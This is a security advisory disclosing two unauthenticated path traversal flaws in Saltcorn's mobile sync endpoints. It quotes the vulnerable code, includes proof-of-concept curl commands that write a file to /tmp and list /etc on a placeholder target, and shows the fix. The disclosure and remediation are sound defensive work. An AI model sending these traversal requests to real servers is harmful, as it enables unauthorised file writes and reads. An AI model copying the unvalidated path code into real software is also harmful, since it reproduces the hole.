Affected Package

Package Affected Versions Patched Versions
@saltcorn/server (npm) <= 1.6.0-beta.2 1.4.5, 1.5.5, 1.6.0-beta.4

Summary

Two unauthenticated path traversal vulnerabilities exist in Saltcorn's mobile sync endpoints. The POST /sync/offline_changes endpoint permits an attacker to create arbitrary directories and write JSON files anywhere on the server. The GET /sync/upload_finished endpoint allows directory listing and reading of specific JSON files from arbitrary locations.

Vulnerability Details

Finding 1: Arbitrary File Write (POST /sync/offline_changes)

The newSyncTimestamp parameter is directly used in path operations without validation:

const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`; const syncDir = path.join( rootFolder.location, "mobile_app", "sync", syncDirName ); await fs.mkdir(syncDir, { recursive: true }); await fs.writeFile( path.join(syncDir, "changes.json"), JSON.stringify(changes) );

No authentication is required. By setting newSyncTimestamp to ../../../../tmp/evil, an attacker can write files outside the intended directory.

Finding 2: Arbitrary Directory Read (GET /sync/upload_finished)

The dir_name query parameter is used unsafely:

const syncDir = path.join( rootFolder.location, "mobile_app", "sync", dir_name ); let entries = await fs.readdir(syncDir);

An attacker can enumerate directory contents and read JSON files from any location on the system.

Impact

  • Unauthenticated directory creation anywhere on the filesystem
  • Unauthenticated JSON file writes to any writable location
  • Unauthenticated directory listing capabilities
  • Unauthenticated JSON file reading from arbitrary paths
  • Potential remote code execution via writes to sensitive system paths

Proof of Concept

# Write arbitrary file to /tmp/ curl -X POST http://TARGET:3000/sync/offline_changes \ -H "Content-Type: application/json" \ -d '{ "newSyncTimestamp": "../../../../tmp/saltcorn_poc", "oldSyncTimestamp": "0", "changes": {"proof": "path_traversal_write"} }' # List /etc/ directory curl "http://TARGET:3000/sync/upload_finished?dir_name=../../../../etc"

Remediation

Apply path validation using the existing File.normalise_in_base() function to both vulnerable endpoints, consistent with the already-patched clean_sync_dir endpoint:

// offline_changes fix const syncDir = File.normalise_in_base( path.join(rootFolder.location, "mobile_app", "sync"), syncDirName ); if (!syncDir) { return res.status(400).json({ error: "Invalid sync directory name" }); } // upload_finished fix const syncDir = File.normalise_in_base( path.join(rootFolder.location, "mobile_app", "sync"), dir_name ); if (!syncDir) { return res.json({ finished: false }); }

Additionally, add authentication middleware to endpoints that modify server state.
